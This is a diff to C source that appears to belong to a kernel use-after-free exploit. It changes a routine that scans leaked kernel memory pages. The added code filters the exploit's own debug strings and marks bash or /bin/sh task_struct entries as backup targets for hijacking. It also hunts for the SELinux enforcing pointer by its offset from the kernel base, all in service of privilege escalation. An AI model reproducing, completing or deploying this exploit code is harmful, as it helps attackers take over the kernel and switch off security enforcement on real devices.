@@ -1667,42 +1667,39 @@ static int analyze_uaf_page(uint8_t *data, uint64_t va) {
         }
     }
     
+    // Filter self-echo: ignore pages containing exploit debug strings
+    if (strstr(found_str, "Sample:\"") || strstr(found_str, "K-PTRs:") || strstr(found_str, "MarkerOff:")) {
+        return 0; 
+    }
+
     if (kptrs > 5 || strings > 0 || marker_off != -1) {
         fprintf(stderr, "\n[DATA] VA:0x%lx | K-PTRs:%d | STRs:%d | MarkerOff:0x%x | Sample:\"%s\"", 
                 (unsigned long)va, kptrs, strings, marker_off, found_str);
         
-        // Detailed analysis of pointers
-        if (kptrs > 20) {
-            fprintf(stderr, "\n      [ANALYSIS] High K-PTR density! Possible task_struct or thread_info.");
+        // Target bash fallback
+        if (marker_off == -1 && kptrs > 50 && (strstr(found_str, "bash") || strstr(found_str, "/bin/sh"))) {
+             fprintf(stderr, "\n      [!!!] Found BASH/SH task_struct candidate at VA 0x%lx!", (unsigned long)va);
+             // Save to gbuf for potential hijacking if KETO is not found
+             if (*(uint64_t*)(gbuf + 0xb08) == 0) {
+                 *(uint64_t*)(gbuf + 0xb08) = va;
+                 fprintf(stderr, " (saved as backup target)");
+             }
         }
 
-        if (marker_off != -1) {
-            fprintf(stderr, "\n      [MARKER] Found %s at offset 0x%x", MARKER_NAME, marker_off);
-            // Try to find PID/TGID around marker if it's a task_struct
-            // OFFSET_COMM is 0x818, OFFSET_PID is 0x650
-            int potential_pid_off = marker_off - (OFFSET_COMM - OFFSET_PID);
-            if (potential_pid_off >= 0 && potential_pid_off <= 4096 - 4) {
-                int pid = *(int*)(data + potential_pid_off);
-                if (pid > 0 && pid < 100000) {
-                    fprintf(stderr, "\n      [TASK] Potential PID %d at offset 0x%x", pid, potential_pid_off);
-                }
-            }
-            
-            fprintf(stderr, "\n      DUMP around Marker (0x%x): ", marker_off);
-            int start = (marker_off & ~0xf) - 64;
-            if (start < 0) start = 0;
-            for (int i = 0; i < 256 && start + i < 4096; i += 8) {
-                if (i % 32 == 0) fprintf(stderr, "\n        0x%03x: ", start + i);
-                fprintf(stderr, "%016lx ", *(uint64_t*)(data + start + i));
-            }
-        } else {
-            fprintf(stderr, "\n      DUMP 0x00: ");
-            for (int i = 0; i < 128; i += 8) {
-                if (i % 32 == 0 && i > 0) fprintf(stderr, "\n        0x%03x: ", i);
-                fprintf(stderr, "%016lx ", *(uint64_t*)(data + i));
-            }
+        // SELinux context analysis
+        if (strstr(found_str, "selinuxu:object_r")) {
+             fprintf(stderr, "\n      [SELINUX] Found context string. Scanning for enforcing ptr...");
+             for (int i = 0; i < 512; i++) {
+                 uint64_t ptr = ((uint64_t*)data)[i];
+                 if ((ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
+                     // Check if it looks like an offset from base
+                     uint64_t off = ptr - kernel_base;
+                     if (off > 0x2000000 && off < 0x4000000) {
+                         fprintf(stderr, "\n      [SELINUX] Potential enforcing ptr candidate: 0x%lx (off 0x%lx)", (unsigned long)ptr, (unsigned long)off);
+                     }
+                 }
+             }
         }
-        fprintf(stderr, "\n");
     }
     return kptrs;
 }
